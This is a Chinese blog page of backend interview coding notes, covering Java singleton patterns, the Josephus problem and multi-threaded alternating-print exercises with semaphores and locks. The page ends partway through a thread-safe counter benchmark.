<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><h2 id="多线程手撕"><a href="#多线程手撕" class="headerlink" title="多线程手撕"></a>多线程手撕</h2><p><a href="https://articles.zsxq.com/id_41fbmx7jwqr9.html">面试官：手写线程池，我：？面试官：回去等通知吧！ (zsxq.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/94325810">Java面试题|多线程22道必看面试题 - 知乎</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/270171164">手撕面试题：多个线程交替打印问题 - 知乎</a></p>
<h2 id="sql常见手撕题目"><a href="#sql常见手撕题目" class="headerlink" title="sql常见手撕题目"></a>sql常见手撕题目</h2><p><a href="https://www.nowcoder.com/exam/oj?page=1&tab=SQL%E7%AF%87&topicId=199">牛客网在线编程_SQL篇_非技术快速入门</a></p>
<p>其实还有lc（但是要开会员，懒得做了，之前也做过不少）</p>
<h2 id="设计模式手撕及总结"><a href="#设计模式手撕及总结" class="headerlink" title="设计模式手撕及总结"></a>设计模式手撕及总结</h2><h2 id="后端高频笔试题（非常规Leetcode类型）"><a href="#后端高频笔试题（非常规Leetcode类型）" class="headerlink" title="后端高频笔试题（非常规Leetcode类型）"></a>后端高频笔试题（非常规Leetcode类型）</h2><h3 id="设置一个线程池"><a href="#设置一个线程池" class="headerlink" title="设置一个线程池"></a>设置一个线程池</h3><h3 id="写三种单例模式的实现⽅式"><a href="#写三种单例模式的实现⽅式" class="headerlink" title="写三种单例模式的实现⽅式"></a>写三种单例模式的实现⽅式</h3><p>一般来说应该有七种</p>
<p>枚举类实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Singleton</span> <span class="variable">instance1</span> <span class="operator">=</span> Singleton.INSTANCE;</span><br><span class="line"><span class="type">Singleton</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton.INSTANCE;</span><br><span class="line">System.out.println(<span class="string">&quot;instance1: &quot;</span> + System.identityHashCode(instance1));</span><br><span class="line">System.out.println(<span class="string">&quot;instance2: &quot;</span> + System.identityHashCode(instance2));</span><br></pre></td></tr></table></figure>

<p>内部静态类实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonInner.singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SingletonInner</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">singleton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DLC实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton singleton;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(singleton == <span class="literal">null</span>)&#123;</span><br><span class="line">                    singleton = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>volatile必须的，不然可能返回了singleton，但里面还没有初始化</p>
<h3 id="最后⼀⼈的编号"><a href="#最后⼀⼈的编号" class="headerlink" title="最后⼀⼈的编号"></a>最后⼀⼈的编号</h3><p>递推数学证明：<a href="https://www.zhihu.com/tardis/zm/art/121159246?source_id=1005">这或许是你能找到的最详细约瑟夫环数学推导！</a></p>
<p>lc对应题目：<a href="https://leetcode.cn/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">LCR 187. 破冰游戏 - 力扣（LeetCode）</a></p>
<p>证明思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f(n,m) = h(n-1,m)</span><br><span class="line">h(n - 1,m) 表示从 k + 1, ... ,n - 1,0,....k-1 做约瑟夫环操作，最后剩下的数字</span><br><span class="line">我们做映射0 -&gt; K + 1， 1 -&gt; k + 2</span><br><span class="line">即 x - &gt; (x+k+1)%n</span><br><span class="line">即f(n,m) = [f(n-1,m) + k + 1] % m</span><br><span class="line">这里 k = (m - 1) % n 带入得</span><br><span class="line">f(n,m) = [f(n-1,m) + m] % n</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int iceBreakingGame(int n, int k) &#123;</span><br><span class="line">        if(n == 1) return 0;</span><br><span class="line">        return (iceBreakingGame(n - 1, k) + k) % n;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="交替打印奇偶数"><a href="#交替打印奇偶数" class="headerlink" title="交替打印奇偶数"></a>交替打印奇偶数</h3><p>问题描述：写两个线程打印 1-100，⼀个线程打印奇数，⼀个线程打印偶数。</p>
<p>思路：wait、noftify，locksupport、信号量也行</p>
<p>代码一：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParityPrinter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> MAX_VALUE;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ParityPrinter</span><span class="params">(<span class="type">int</span> maxValue)</span> &#123;</span><br><span class="line">        MAX_VALUE = maxValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printOdd</span><span class="params">()</span>&#123;</span><br><span class="line">        print(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printEven</span><span class="params">()</span>&#123;</span><br><span class="line">        print(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">boolean</span> isOdd)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= MAX_VALUE; i += <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lock)&#123;</span><br><span class="line">                <span class="keyword">while</span> (isOdd == (count % <span class="number">2</span> == <span class="number">0</span>))&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        lock.wait();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        Thread.currentThread().interrupt();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                log.debug(String.valueOf(count++));</span><br><span class="line">                lock.notify();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParityPrinter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParityPrinter</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printOdd,<span class="string">&quot;odd&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printEven,<span class="string">&quot;even&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意点：怎样保障先打印1，而不是打印2。使用while (isOdd &#x3D;&#x3D; (count % 2 &#x3D;&#x3D; 0))来维护</p>
<p>代码二：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParityPrinter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> MAX_VALUE;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">Semaphore</span> <span class="variable">oddSemaphore</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">Semaphore</span> <span class="variable">evenSemaphore</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ParityPrinter</span><span class="params">(<span class="type">int</span> maxValue)</span> &#123;</span><br><span class="line">        MAX_VALUE = maxValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printOdd</span><span class="params">()</span>&#123;</span><br><span class="line">        print(oddSemaphore, evenSemaphore);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printEven</span><span class="params">()</span>&#123;</span><br><span class="line">        print(evenSemaphore, oddSemaphore);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(Semaphore cur, Semaphore next)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= MAX_VALUE; i += <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cur.acquire();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            log.info(String.valueOf(count++));</span><br><span class="line">            next.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">ParityPrinter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParityPrinter</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printOdd,<span class="string">&quot;odd&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printEven,<span class="string">&quot;even&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="交替打印-ABC"><a href="#交替打印-ABC" class="headerlink" title="交替打印 ABC"></a>交替打印 ABC</h3><p>思路根前面差不多，加一个线程。但三个线程不能使用 synchronized 了。hold不住了</p>
<p>思路一：Semaphore</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParityPrinter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> ROUND;</span><br><span class="line">    <span class="type">Semaphore</span> <span class="variable">semaphoreA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">Semaphore</span> <span class="variable">semaphoreB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">Semaphore</span> <span class="variable">semaphoreC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ParityPrinter</span><span class="params">(<span class="type">int</span> round)</span> &#123;</span><br><span class="line">        ROUND = round;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printA</span><span class="params">()</span>&#123;</span><br><span class="line">        print(semaphoreA, semaphoreB, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printB</span><span class="params">()</span>&#123;</span><br><span class="line">        print(semaphoreB, semaphoreC, <span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printC</span><span class="params">()</span>&#123;</span><br><span class="line">        print(semaphoreC, semaphoreA, <span class="string">&quot;C&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(Semaphore cur, Semaphore next, String printStr)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= ROUND; i ++)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cur.acquire();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            log.info(printStr);</span><br><span class="line">            next.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">ParityPrinter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParityPrinter</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printA,<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printB,<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printC,<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二：ReentrantLock + Condition </p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParityPrinter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> ROUND;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">conditionA</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">conditionB</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">conditionC</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ParityPrinter</span><span class="params">(<span class="type">int</span> round)</span> &#123;</span><br><span class="line">        ROUND = round;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="number">0</span>, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">        map.put(<span class="number">1</span>, <span class="string">&quot;B&quot;</span>);</span><br><span class="line">        map.put(<span class="number">2</span>, <span class="string">&quot;C&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;Integer, String&gt; map;</span><br><span class="line">    <span class="type">int</span> <span class="variable">turn</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printA</span><span class="params">()</span>&#123;</span><br><span class="line">        print(conditionA, conditionB, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printB</span><span class="params">()</span>&#123;</span><br><span class="line">        print(conditionB, conditionC, <span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printC</span><span class="params">()</span>&#123;</span><br><span class="line">        print(conditionC, conditionA, <span class="string">&quot;C&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(Condition cur, Condition next, String printStr)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= ROUND; i ++)&#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (!Objects.equals(map.get(turn), printStr))&#123;</span><br><span class="line">                    cur.await();</span><br><span class="line">                &#125;</span><br><span class="line">                turn = (turn + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">                log.info(printStr);</span><br><span class="line">                next.signal();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">ParityPrinter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParityPrinter</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printA,<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printB,<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printC,<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不用信号量的话，需要用类似turn的变量控制顺序</p>
<h3 id="三个线程交替打印-1-到-99"><a href="#三个线程交替打印-1-到-99" class="headerlink" title="三个线程交替打印 1 到 99"></a>三个线程交替打印 1 到 99</h3><p>跟前面很像</p>
<p>这里使用Supplier<Boolean>来定义函数看起来高级点</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParityPrinter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> MAX_COUNT;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">conditionA</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">conditionB</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">conditionC</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ParityPrinter</span><span class="params">(<span class="type">int</span> maxCount)</span> &#123;</span><br><span class="line">        MAX_COUNT = maxCount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printA</span><span class="params">()</span>&#123;</span><br><span class="line">        print(conditionA, conditionB, ()-&gt; count % <span class="number">3</span> == <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printB</span><span class="params">()</span>&#123;</span><br><span class="line">        print(conditionB, conditionC, ()-&gt; count % <span class="number">3</span> == <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printC</span><span class="params">()</span>&#123;</span><br><span class="line">        print(conditionC, conditionA, ()-&gt; count % <span class="number">3</span> == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(Condition cur, Condition next, Supplier&lt;Boolean&gt; shouldPrint)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= MAX_COUNT)&#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (! shouldPrint.get())&#123;</span><br><span class="line">                    cur.await();</span><br><span class="line">                &#125;</span><br><span class="line">                log.info(String.valueOf(count++));</span><br><span class="line">                next.signal();</span><br><span class="line">                i += <span class="number">3</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">ParityPrinter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParityPrinter</span>(<span class="number">99</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printA,<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printB,<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(printer::printC,<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实现⼀个线程安全的计数器"><a href="#实现⼀个线程安全的计数器" class="headerlink" title="实现⼀个线程安全的计数器"></a>实现⼀个线程安全的计数器</h3><p><a href="https://juejin.cn/post/7031934004307689480">并发操作 AtomicLong &amp; LongAdder区别在 JDK1.5 中新增了并发情况下使用的 Integer&#x2F;L - 掘金</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">fixedThreadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">100</span>);</span><br><span class="line"><span class="type">AtomicLong</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">    fixedThreadPool.submit(() -&gt;&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">100</span>; j++)&#123;</span><br><span class="line">            counter.incrementAndGet();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">fixedThreadPool.shutdown();</span><br><span class="line">fixedThreadPool.awaitTermination(<span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">fixedThreadPool.shutdownNow();</span><br><span class="line">fixedThreadPool.awaitTermination(<span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">log.info(String.valueOf(counter.get()));</span><br><span class="line">log.info(<span class="string">&quot;totTime:&quot;</span> + (end - start));</span><br></pre></td></tr></table></figure>

<p>16:45:47.287 [main] INFO com.example.demo.TestThread - 10000<br>16:45:47.289 [main] INFO com.example.demo.TestThread - totTime:35</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">fixedThreadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">100</span>);</span><br><span class="line"><span class="type">LongAdder</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LongAdder</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">    fixedThreadPool.submit(() -&gt;&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">100</span>; j++)&#123;</span><br><span class="line">            counter.increment();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">fixedThreadPool.shutdown();</span><br><span class="line">fixedThreadPool.awaitTermination(<span class="number">10</span>, 